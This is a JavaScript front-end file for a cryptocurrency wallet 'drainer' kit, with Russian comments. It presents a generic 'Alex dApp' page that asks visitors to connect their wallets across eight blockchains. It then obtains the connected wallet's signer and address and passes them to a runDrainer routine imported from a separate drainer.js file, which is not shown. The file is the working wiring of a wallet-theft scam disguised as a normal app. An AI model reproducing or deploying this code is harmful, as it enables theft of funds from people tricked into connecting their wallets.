import { createAppKit } from '@reown/appkit'
import {
  mainnet,
  polygon,
  bsc,
  avalanche,
  arbitrum,
  optimism,
  linea,
  base
} from '@reown/appkit/networks'
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
import { ethers } from 'ethers'
import { runDrainer } from './drainer.js'

const projectId = 'd85cc83edb401b676e2a7bcef67f3be8'
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base]

const wagmiAdapter = new WagmiAdapter({ projectId, networks })

const metadata = {
  name: 'Alex dApp',
  description: 'Connect your wallet',
  url: 'https://checkalex.xyz',
  icons: ['https://checkalex.xyz/icon.png']
}

const modal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  metadata,
  projectId,
  features: {
    analytics: true
  }
})

let signer = null
let address = null

// После подключения — получаем signer и включаем кнопку
modal.on('connect', async () => {
  try {
    const provider = new ethers.BrowserProvider(window.ethereum, 'any')
    signer = await provider.getSigner()
    address = await signer.getAddress()

    document.getElementById('status').textContent = `✅ Подключено: ${address}`
    document.getElementById('drainer-btn').disabled = false
  } catch (e) {
    console.error('Ошибка при получении signer:', e)
  }
})

// Открыть модальное окно для подключения
document.getElementById('open-connect-modal').addEventListener('click', () => {
  modal.open()
})

// Запуск drainer-а
document.getElementById('drainer-btn').addEventListener('click', async () => {
  if (!signer || !address) {
    alert('Сначала подключите кошелёк!')
    return
  }

  try {
    await runDrainer(signer.provider, signer, address)
  } catch (e) {
    console.error("Ошибка в Drainer:", e)
    alert("Ошибка при вызове контракта: " + e.message)
  }
})
